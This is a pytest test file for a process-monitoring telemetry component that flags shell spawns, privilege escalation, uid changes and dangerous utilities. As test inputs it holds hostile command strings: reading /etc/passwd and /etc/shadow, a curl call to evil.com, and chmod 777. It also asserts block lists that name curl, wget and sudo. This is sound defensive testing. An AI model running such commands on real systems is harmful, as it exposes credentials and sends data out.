"""Tests for ProcessMonitor."""

import os
import time
from pathlib import Path
from unittest.mock import patch, MagicMock

import psutil
import pytest

from src.telemetry.process_monitor import ProcessMonitor, SHELL_PROCESSES, PRIV_ESCALATION, DANGEROUS_UTILS
from src.telemetry.types import Severity


class TestProcessMonitorConstants:
    def test_shell_processes_not_empty(self):
        assert len(SHELL_PROCESSES) > 0
        assert "bash" in SHELL_PROCESSES
        assert "sh" in SHELL_PROCESSES

    def test_priv_escalation_not_empty(self):
        assert len(PRIV_ESCALATION) > 0
        assert "sudo" in PRIV_ESCALATION

    def test_dangerous_utils_not_empty(self):
        assert len(DANGEROUS_UTILS) > 0
        assert "curl" in DANGEROUS_UTILS
        assert "wget" in DANGEROUS_UTILS


class TestProcessMonitor:
    @pytest.fixture
    def events(self):
        return []

    @pytest.fixture
    def monitor(self, tmp_path, events):
        return ProcessMonitor(
            workspace_path=tmp_path,
            on_event=events.append,
            poll_interval=0.1,
        )

    def test_init(self, monitor):
        assert monitor._pid is None
        assert monitor._running is False
        assert monitor._seen_pids == set()

    def test_attach_pid(self, monitor):
        monitor.attach_pid(12345)
        assert monitor._pid == 12345

    def test_attach_pid_with_uid(self, monitor):
        mock_proc = MagicMock()
        mock_proc.uids.return_value = MagicMock(real=1000)

        with patch("psutil.Process", return_value=mock_proc):
            monitor.attach_pid(12345)

        assert monitor._original_uid == 1000

    def test_attach_pid_failure(self, monitor):
        with patch("psutil.Process", side_effect=psutil.NoSuchProcess(12345)):
            monitor.attach_pid(12345)

        assert monitor._original_uid is None

    def test_start_stop(self, monitor):
        monitor.start()
        assert monitor._running is True
        assert monitor._thread is not None
        assert monitor._thread.is_alive()

        monitor.stop()
        assert monitor._running is False
        assert not monitor._thread.is_alive()

    def test_poll_loop_exits_on_stop(self, monitor):
        monitor.start()
        time.sleep(0.3)
        monitor.stop()
        assert not monitor._thread.is_alive()

    def test_scan_process_tree_no_pid(self, monitor, events):
        monitor._scan_process_tree()
        assert len(events) == 0

    def test_scan_process_tree_nonexistent_pid(self, monitor, events):
        with patch("psutil.Process", side_effect=psutil.NoSuchProcess(999999)):
            monitor.attach_pid(999999)
            monitor._scan_process_tree()

        assert len(events) == 0

    def test_check_process_shell_escape(self, monitor, events):
        mock_proc = MagicMock()
        mock_proc.pid = 12345
        mock_proc.ppid.return_value = 1000

        monitor._check_process(mock_proc, "bash", "bash -c 'cat /etc/passwd'")

        assert len(events) == 1
        assert events[0].event_type == "shell_escape"
        assert events[0].severity == Severity.CRITICAL
        assert "bash" in events[0].evidence

    def test_check_process_privilege_escalation(self, monitor, events):
        mock_proc = MagicMock()
        mock_proc.pid = 12345
        mock_proc.ppid.return_value = 1000

        monitor._check_process(mock_proc, "sudo", "sudo cat /etc/shadow")

        assert len(events) == 1
        assert events[0].event_type == "privilege_escalation"
        assert events[0].severity == Severity.CRITICAL

    def test_check_process_dangerous_utility_network(self, monitor, events):
        mock_proc = MagicMock()
        mock_proc.pid = 12345
        mock_proc.ppid.return_value = 1000

        monitor._check_process(mock_proc, "curl", "curl http://evil.com/data")

        assert len(events) == 1
        assert events[0].event_type == "dangerous_utility"
        assert events[0].severity == Severity.CRITICAL

    def test_check_process_dangerous_utility_permission(self, monitor, events):
        mock_proc = MagicMock()
        mock_proc.pid = 12345
        mock_proc.ppid.return_value = 1000

        monitor._check_process(mock_proc, "chmod", "chmod 777 /tmp/file")

        assert len(events) == 1
        assert events[0].event_type == "dangerous_utility"
        assert events[0].severity == Severity.WARNING

    def test_check_process_uid_change(self, monitor, events):
        mock_proc = MagicMock()
        mock_proc.pid = 12345
        mock_proc.uids.return_value = MagicMock(real=0)
        monitor._original_uid = 1000

        monitor._check_process(mock_proc, "python", "python script.py")

        uid_changes = [e for e in events if e.event_type == "uid_change"]
        assert len(uid_changes) == 1
        assert uid_changes[0].severity == Severity.CRITICAL

    def test_check_process_unexpected_process(self, monitor, events):
        mock_proc = MagicMock()
        mock_proc.pid = 12345
        mock_proc.ppid.return_value = 1000

        monitor._check_process(mock_proc, "weird_tool", "weird_tool arg1 arg2")

        unexpected = [e for e in events if e.event_type == "unexpected_process"]
        assert len(unexpected) == 1
        assert unexpected[0].severity == Severity.INFO

    def test_check_process_expected_process(self, monitor, events):
        mock_proc = MagicMock()
        mock_proc.pid = 12345
        mock_proc.ppid.return_value = 1000

        monitor._check_process(mock_proc, "python", "python script.py")

        assert len(events) == 0

    def test_check_process_access_denied(self, monitor, events):
        mock_proc = MagicMock()
        mock_proc.pid = 12345
        mock_proc.name.side_effect = psutil.AccessDenied

        monitor._check_process(mock_proc, "unknown", "")

        unexpected = [e for e in events if e.event_type == "unexpected_process"]
        assert len(unexpected) == 1

    def test_emit_event(self, tmp_path):
        events = []
        monitor = ProcessMonitor(
            workspace_path=tmp_path,
            on_event=events.append,
        )
        monitor._emit_event(
            event_type="shell_escape",
            severity=Severity.CRITICAL,
            pid=123,
            details={"process": "bash"},
            evidence="Shell spawned",
        )
        assert len(events) == 1
        assert events[0].monitor == "process"
        assert events[0].event_type == "shell_escape"

    def test_scan_with_mock_children(self, monitor, events):
        mock_child = MagicMock()
        mock_child.pid = 12346
        mock_child.name.return_value = "bash"
        mock_child.cmdline.return_value = ["bash", "-c", "echo hello"]
        mock_child.ppid.return_value = 12345
        mock_child.uids.return_value = MagicMock(real=1000)

        mock_parent = MagicMock()
        mock_parent.pid = 12345
        mock_parent.name.return_value = "python"
        mock_parent.cmdline.return_value = ["python", "script.py"]
        mock_parent.ppid.return_value = 1000
        mock_parent.uids.return_value = MagicMock(real=1000)
        mock_parent.children.return_value = [mock_child]

        with patch("psutil.Process", return_value=mock_parent):
            monitor.attach_pid(12345)
            monitor._scan_process_tree()

        shell_events = [e for e in events if e.event_type == "shell_escape"]
        assert len(shell_events) == 1

    def test_scan_process_tree_zombie_child(self, monitor, events):
        mock_child = MagicMock()
        mock_child.pid = 12346
        mock_child.name.side_effect = psutil.ZombieProcess(12346)

        mock_parent = MagicMock()
        mock_parent.pid = 12345
        mock_parent.name.return_value = "python"
        mock_parent.cmdline.return_value = ["python", "script.py"]
        mock_parent.ppid.return_value = 1000
        mock_parent.uids.return_value = MagicMock(real=1000)
        mock_parent.children.return_value = [mock_child]

        with patch("psutil.Process", return_value=mock_parent):
            monitor.attach_pid(12345)
            monitor._scan_process_tree()

        assert len(events) == 0

    def test_multiple_shell_escapes(self, monitor, events):
        mock_proc = MagicMock()
        mock_proc.pid = 12345
        mock_proc.ppid.return_value = 1000

        monitor._check_process(mock_proc, "bash", "bash -c 'cmd1'")
        monitor._check_process(mock_proc, "sh", "sh -c 'cmd2'")
        monitor._check_process(mock_proc, "zsh", "zsh -c 'cmd3'")

        shell_events = [e for e in events if e.event_type == "shell_escape"]
        assert len(shell_events) == 3

    def test_process_not_in_seen_pids(self, monitor, events):
        mock_proc = MagicMock()
        mock_proc.pid = 99999
        mock_proc.name.return_value = "bash"
        mock_proc.cmdline.return_value = ["bash"]
        mock_proc.ppid.return_value = 1000
        mock_proc.uids.return_value = MagicMock(real=1000)
        monitor._original_uid = 1000

        monitor._seen_pids.add(99999)
        monitor._check_process(mock_proc, "bash", "bash")

        shell_events = [e for e in events if e.event_type == "shell_escape"]
        assert len(shell_events) == 1
